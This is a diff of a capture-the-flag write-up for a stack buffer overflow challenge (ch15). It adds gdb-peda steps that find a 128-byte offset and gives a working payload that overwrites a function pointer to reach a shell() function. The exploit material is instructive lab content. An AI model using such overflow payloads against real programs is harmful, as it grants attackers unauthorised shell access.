@@ -31,18 +31,31 @@ void main()
 }
 ```
 ## Write-up:
-- As a normal code flow, the program will point to the address of **sup()** function and execute it. So we need to override the "ret addr" and point it to **shell()** function. - Using gdb and disassembler the **main()** function:<br>
-![image](https://user-images.githubusercontent.com/48288606/141277701-1e1e1c08-997a-47ba-be6a-1129505aee79.png)
+- As a normal code flow, the program will point to the address of **sup()** function and execute it. So we need to override the "ret addr" and point it to **shell()** function. - Using gdb and disassembler the **main()** function and save the address of **shell (0x08048516)** <br>
+
+![image](https://user-images.githubusercontent.com/48288606/146747232-e78b70c2-9af0-413a-a20d-2b39be64cf96.png)
  
-- Poke around and find the **shell()**'s address at **0x08048516**:<br>
-![image](https://user-images.githubusercontent.com/48288606/141276299-ec52a57d-f7cb-48de-a655-2862d97402c3.png)
-- Let's try filling with 128 arbitrary bytes and the address of **sup()** function at **0x08048559**
+- Set breakpoint at **fgets function**. Run the program
 ```
-app-systeme-ch15@challenge02:~$ python -c "print('a'*128+'\x59\x85\x04\x08')" | ./ch15
-Hey dude ! Waaaaazzaaaaaaaa ?!
-Segmentation fault
+gdb-peda$ b*main+0
+Breakpoint 1 at 0x8048584
 ```
-"Segmentation fault" cuz we're executing onto a sensitive part of stack, don't mind that. Clearly, we can access to the satisfying function and carry out the code
+
+-  Input `aaaaaaaa`and watch the value. 
+
+![image](https://user-images.githubusercontent.com/48288606/146749346-4e182441-effa-4519-8d5a-09a2d4452c7a.png)
+
+- Our input's at **0xbffffa9c**. Now watch the return address of **sup function**.
+
+![image](https://user-images.githubusercontent.com/48288606/146752691-aa64fb0d-7b34-4ea0-ab63-1097ee23671f.png)
+
+
+- **sup** is at **0xbffffb1c**. Calculate the distance from **buffer** to address of **sup function**.
+```
+gdb-peda$ p/d 0xbffffb1c-0xbffffa9c
+$5 = 128
+```
+
 ### Solution:
 - First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function. <br>
 Payload: `(python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15` <br>
